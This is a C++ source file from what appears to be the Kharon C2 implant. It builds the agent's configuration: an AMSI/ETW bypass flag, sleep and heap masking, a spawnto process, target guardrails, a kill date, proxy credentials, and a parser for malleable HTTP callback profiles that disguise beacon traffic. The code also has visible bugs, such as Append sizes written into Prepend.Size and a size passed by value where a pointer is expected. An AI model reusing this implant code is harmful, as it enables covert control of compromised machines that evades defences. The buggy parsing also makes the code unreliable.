#include <Kharon.h>

auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
    G_KHARON

    //cfg
    Cfg->AgentId       = KH_AGENT_UUID;
    Cfg->SleepTime     = KH_SLEEP_TIME * 1000;
    Cfg->Jitter        = KH_JITTER;
    Cfg->BofProxy      = KH_BOF_HOOK_ENABLED;
    Cfg->Syscall       = KH_SYSCALL;
    Cfg->AmsiEtwBypass = KH_AMSI_ETW_BYPASS;

    static BYTE ENCRYPT_KEY_ARRAY[] = KH_CRYPT_KEY;

    for ( int i = 0; i < 16 ; i++ ) {
        Cfg->EncryptKey[i] = ENCRYPT_KEY_ARRAY[i];
    }

    // mask
    Cfg->Mask.Beacon = KH_SLEEP_MASK;
    Cfg->Mask.Heap   = KH_HEAP_MASK;

    // postex
    Cfg->Postex.Spawnto  = KH_SPAWNTO_X64;
    Cfg->Postex.ForkPipe = KH_FORK_PIPE_NAME;

    // worktime
    Cfg->Worktime.StartHour = KH_WORKTIME_START_HOUR;
    Cfg->Worktime.StartMin  = KH_WORKTIME_START_MIN;
    Cfg->Worktime.EndHour   = KH_WORKTIME_END_HOUR;
    Cfg->Worktime.EndMin    = KH_WORKTIME_END_MIN;

    Cfg->Worktime.Enabled = KH_WORKTIME_ENABLED;

    // guardrails
    Cfg->Guardrails.UserName   = KH_GUARDRAILS_USER;
    Cfg->Guardrails.DomainName = KH_GUARDRAILS_DOMAIN;
    Cfg->Guardrails.IpAddress  = KH_GUARDRAILS_IPADDRESS;
    Cfg->Guardrails.HostName   = KH_GUARDRAILS_HOST;
    
    // killdate
    Cfg->KillDate.Day   = KH_KILLDATE_DAY;
    Cfg->KillDate.Month = KH_KILLDATE_MONTH;
    Cfg->KillDate.Year  = KH_KILLDATE_YEAR;

    Cfg->KillDate.SelfDelete = FALSE;
    Cfg->KillDate.ExitProc   = TRUE;
    Cfg->KillDate.Enabled    = KH_KILLDATE_ENABLED;

    // http proxy
    Cfg->Http.Proxy.Enabled  = HTTP_PROXY_ENABLED;
    Cfg->Http.Proxy.Url      = HTTP_PROXY_URL;
    Cfg->Http.Proxy.Username = HTTP_PROXY_USERNAME;
    Cfg->Http.Proxy.Password = HTTP_PROXY_PASSWORD;

    // http malleable
    Cfg->Http.Secure = HTTP_SECURE_ENABLED;

    PARSER* HttpParser   = (PARSER*)KhAlloc( sizeof( PARSER ) );
    BYTE    HttpConfig[] = HTTP_MALLEABLE_BYTES;

    HttpParser->Original = (CHAR*)KhAlloc( sizeof( HttpConfig ) );

    Mem::Copy( HttpParser->Original, HttpConfig, sizeof( HttpConfig ) );

    HttpParser->Buffer   = HttpParser->Original;
    HttpParser->Size     = sizeof( HttpConfig );
    HttpParser->Length   = sizeof( HttpConfig );

    INT32 CallbackCount      = Self->Psr->Int32( HttpParser );
    Cfg->Http.CallbacksCount = CallbackCount;

    KhDbg( "[*] HTTP Malleable: CallbackCount = %d", CallbackCount );

    Cfg->Http.Callbacks = (HTTP_CALLBACKS**)KhAlloc( CallbackCount * sizeof( PVOID ) );

    for ( int i = 0; i < CallbackCount; i++ ) {
        Cfg->Http.Callbacks[i] = (HTTP_CALLBACKS*)KhAlloc( CallbackCount * sizeof( HTTP_CALLBACKS ) );
    }

    for ( int i = 0; i < Cfg->Http.CallbacksCount; i++ ) {
        KhDbg( "[*] HTTP Malleable: Processing Callback %d", i );

        HTTP_CALLBACKS* Callback = Cfg->Http.Callbacks[i];

        Callback->Host      = Self->Psr->Wstr( HttpParser, nullptr );
        Callback->Port      = Self->Psr->Int32( HttpParser );
        Callback->UserAgent = Self->Psr->Wstr( HttpParser, nullptr );
        
        KhDbg( "[*] HTTP Malleable: Host = %ls, Port = %d, UserAgent = %ls", Callback->Host, Callback->Port, Callback->UserAgent );

        ULONG MethodFlag = Self->Psr->Int32( HttpParser );
        Callback->Method = MethodFlag;

        KhDbg( "[*] HTTP Malleable: MethodFlag = 0x%X", MethodFlag );

        HTTP_METHOD* GetMethod  = &Callback->Get;
        HTTP_METHOD* PostMethod = &Callback->Post;

        if ( 
            MethodFlag == HTTP_METHOD_ONLY_POST || 
            MethodFlag == HTTP_METHOD_USE_BOTH
        ) {
            KhDbg( "[*] HTTP Malleable: Processing POST Method" );

            PostMethod->Headers            = Self->Psr->Wstr( HttpParser, nullptr );
            PostMethod->DoNothingBuff.Size = Self->Psr->Int32( HttpParser );
            PostMethod->DoNothingBuff.Ptr  = Self->Psr->Pad( HttpParser, PostMethod->DoNothingBuff.Size );
            PostMethod->CookiesCount       = Self->Psr->Int32( HttpParser );

            KhDbg( "[*] HTTP Malleable: POST Headers = %ls, CookiesCount = %d, Empty Response = %p [%d]", PostMethod->Headers, PostMethod->CookiesCount, PostMethod->DoNothingBuff.Ptr, PostMethod->DoNothingBuff.Size );

            if ( PostMethod->CookiesCount ) {
                PostMethod->Cookies = (ARRAY_PAIRW**)KhAlloc( PostMethod->CookiesCount * sizeof( PVOID ) );
            }

            for ( int x = 0; x < PostMethod->CookiesCount; x++ ) {
                PostMethod->Cookies[x] = (ARRAY_PAIRW*)KhAlloc( sizeof( ARRAY_PAIRW ) );

                PostMethod->Cookies[x]->Key   = Self->Psr->Wstr( HttpParser, nullptr );
                PostMethod->Cookies[x]->Value = Self->Psr->Wstr( HttpParser, nullptr );

                KhDbg( "[*] HTTP Malleable: POST Cookie %d = %ls : %ls", x, PostMethod->Cookies[x]->Key, PostMethod->Cookies[x]->Value );
            }

            PostMethod->EndpointCount = Self->Psr->Int32( HttpParser );
            PostMethod->Endpoints     = (HTTP_ENDPOINT**)KhAlloc( PostMethod->EndpointCount * sizeof( PVOID ) );

            KhDbg( "[*] HTTP Malleable: POST EndpointCount = %d", PostMethod->EndpointCount );

            for ( int x = 0; x < PostMethod->EndpointCount; x++ ) {
                PostMethod->Endpoints[x] = (HTTP_ENDPOINT*)KhAlloc( sizeof( HTTP_ENDPOINT ) );

                HTTP_ENDPOINT* Endpoint     = PostMethod->Endpoints[x];
                OUTPUT_FORMAT* ServerOutput = &Endpoint->ServerOutput;
                OUTPUT_FORMAT* ClientOutput = &Endpoint->ClientOutput;

                Endpoint->Path           = Self->Psr->Wstr( HttpParser, nullptr );
                Endpoint->Parameters.Ptr = (PBYTE)Self->Psr->Wstr( HttpParser, (ULONG*)&Endpoint->Parameters.Size );

                KhDbg( "[*] HTTP Malleable: POST Endpoint %d Path = %ls, Params = [%d] %ls", x, Endpoint->Path, Endpoint->Parameters.Size, Endpoint->Parameters.Ptr );

                // client output
                
                ClientOutput->Mask        = Self->Psr->Int32( HttpParser );
                ClientOutput->Type        = (OUTPUT_TYPE)Self->Psr->Int32( HttpParser );
                ClientOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                ClientOutput->MaxDataSize = Self->Psr->Int32( HttpParser );

                KhDbg( "[*] HTTP Malleable: POST ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );

                if ( ClientOutput->Type != Output_Body ) {
                    ClientOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->OutputBuff.Size );
                }

                ClientOutput->Append.Ptr    = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Append.Size );
                ClientOutput->Prepend.Ptr   = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Prepend.Size );
                ClientOutput->FalseBody.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->FalseBody.Size );

                KhDbg( "[*] HTTP Malleable: POST Client Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );

                // server output

                ServerOutput->Mask        = Self->Psr->Int32( HttpParser );
                ServerOutput->Type        = (OUTPUT_TYPE)Self->Psr->Int32( HttpParser );
                ServerOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                ServerOutput->MaxDataSize = Self->Psr->Int32( HttpParser );

                KhDbg( "[*] HTTP Malleable: POST ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );

                if ( ServerOutput->Type != Output_Body ) {
                    ServerOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)ServerOutput->OutputBuff.Size );
                }

                ServerOutput->Append.Ptr    = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->Append.Size );
                ServerOutput->Prepend.Ptr   = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->Prepend.Size );
                ServerOutput->FalseBody.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->FalseBody.Size );

                KhDbg( "[*] HTTP Malleable: POST Server Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ServerOutput->Append.Ptr, ServerOutput->Append.Size, ServerOutput->Prepend.Ptr, ServerOutput->Prepend.Size, ServerOutput->FalseBody.Ptr, ServerOutput->FalseBody.Size );
            }
        }

        if ( 
            MethodFlag == HTTP_METHOD_ONLY_GET || 
            MethodFlag == HTTP_METHOD_USE_BOTH
        ) {
            KhDbg( "[*] HTTP Malleable: Processing GET Method" );

            GetMethod->Headers            = Self->Psr->Wstr( HttpParser, nullptr );
            GetMethod->DoNothingBuff.Size = Self->Psr->Int32( HttpParser );
            GetMethod->DoNothingBuff.Ptr  = Self->Psr->Pad( HttpParser, GetMethod->DoNothingBuff.Size );
            GetMethod->CookiesCount       = Self->Psr->Int32( HttpParser );

            KhDbg( "[*] HTTP Malleable: GET Headers = %ls, CookiesCount = %d, Empty Response = %p [%d]", GetMethod->Headers, GetMethod->CookiesCount, GetMethod->DoNothingBuff.Ptr, GetMethod->DoNothingBuff.Size );

            if ( GetMethod->CookiesCount ) {
                GetMethod->Cookies = (ARRAY_PAIRW**)KhAlloc( GetMethod->CookiesCount * sizeof( PVOID ) );
            }

            for ( int x = 0; x < GetMethod->CookiesCount; x++ ) {
                GetMethod->Cookies[x] = (ARRAY_PAIRW*)KhAlloc( sizeof( ARRAY_PAIRW ) );

                GetMethod->Cookies[x]->Key   = Self->Psr->Wstr( HttpParser, nullptr );
                GetMethod->Cookies[x]->Value = Self->Psr->Wstr( HttpParser, nullptr );

                KhDbg( "[*] HTTP Malleable: GET Cookie %d = %ls : %ls", x, GetMethod->Cookies[x]->Key, GetMethod->Cookies[x]->Value );
            }

            GetMethod->EndpointCount = Self->Psr->Int32( HttpParser );
            GetMethod->Endpoints     = (HTTP_ENDPOINT**)KhAlloc( GetMethod->EndpointCount * sizeof( PVOID ) );

            KhDbg( "[*] HTTP Malleable: GET EndpointCount = %d", GetMethod->EndpointCount );

            for ( int x = 0; x < GetMethod->EndpointCount; x++ ) {
                GetMethod->Endpoints[x] = (HTTP_ENDPOINT*)KhAlloc( sizeof( HTTP_ENDPOINT ) );

                HTTP_ENDPOINT* Endpoint     = GetMethod->Endpoints[x];
                OUTPUT_FORMAT* ServerOutput = &Endpoint->ServerOutput;
                OUTPUT_FORMAT* ClientOutput = &Endpoint->ClientOutput;

                Endpoint->Path           = Self->Psr->Wstr( HttpParser, nullptr );
                Endpoint->Parameters.Ptr = (PBYTE)Self->Psr->Wstr( HttpParser, (ULONG*)&Endpoint->Parameters.Size );

                KhDbg( "[*] HTTP Malleable: GET Endpoint %d Path = %ls, Params = [%d] %ls", x, Endpoint->Path, Endpoint->Parameters.Size, Endpoint->Parameters.Ptr );

                // client output
                
                ClientOutput->Mask        = Self->Psr->Int32( HttpParser );
                ClientOutput->Type        = (OUTPUT_TYPE)Self->Psr->Int32( HttpParser );
                ClientOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                ClientOutput->MaxDataSize = Self->Psr->Int32( HttpParser );

                KhDbg( "[*] HTTP Malleable: GET ClientOutput Mask = %d, Type = %d, Format = %d", ClientOutput->Mask, ClientOutput->Type, ClientOutput->Format );

                if ( ClientOutput->Type != Output_Body ) {
                    ClientOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->OutputBuff.Size );

                    KhDbg("magic type value: %d %ls %p\n", ClientOutput->OutputBuff.Size, ClientOutput->OutputBuff.Ptr, ClientOutput->OutputBuff.Ptr);
                }

                ClientOutput->Append.Ptr    = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Prepend.Size );
                ClientOutput->Prepend.Ptr   = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->Prepend.Size );
                ClientOutput->FalseBody.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)&ClientOutput->FalseBody.Size );

                KhDbg( "[*] HTTP Malleable: GET ClientOutput Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ClientOutput->Append.Ptr, ClientOutput->Append.Size, ClientOutput->Prepend.Ptr, ClientOutput->Prepend.Size, ClientOutput->FalseBody.Ptr, ClientOutput->FalseBody.Size );

                // server output

                ServerOutput->Mask        = Self->Psr->Int32( HttpParser );
                ServerOutput->Type        = (OUTPUT_TYPE)Self->Psr->Int32( HttpParser );
                ServerOutput->Format      = (OutputFmt)Self->Psr->Int32( HttpParser );
                ServerOutput->MaxDataSize = Self->Psr->Int32( HttpParser );

                KhDbg( "[*] HTTP Malleable: GET ServerOutput Mask = %d, Type = %d, Format = %d", ServerOutput->Mask, ServerOutput->Type, ServerOutput->Format );

                if ( ServerOutput->Type != Output_Body ) {
                    ServerOutput->OutputBuff.Ptr = Self->Psr->Bytes( HttpParser, (ULONG*)ServerOutput->OutputBuff.Size );
                    KhDbg("magic type value: %d %ls %p\n", ServerOutput->OutputBuff.Size, ServerOutput->OutputBuff.Ptr, ServerOutput->OutputBuff.Ptr);
                }

                ServerOutput->Append.Ptr     = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->Prepend.Size );
                ServerOutput->Prepend.Ptr    = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->Prepend.Size );
                ServerOutput->FalseBody.Ptr  = Self->Psr->Bytes( HttpParser, (ULONG*)&ServerOutput->FalseBody.Size );

                KhDbg( "[*] HTTP Malleable: GET Server Output Append = %p [%d], Prepend = %p [%d], FalseBody = %p [%d]", ServerOutput->Append.Ptr, ServerOutput->Append.Size, ServerOutput->Prepend.Ptr, ServerOutput->Prepend.Size, ServerOutput->FalseBody.Ptr, ServerOutput->FalseBody.Size );
            }
        }
    }
}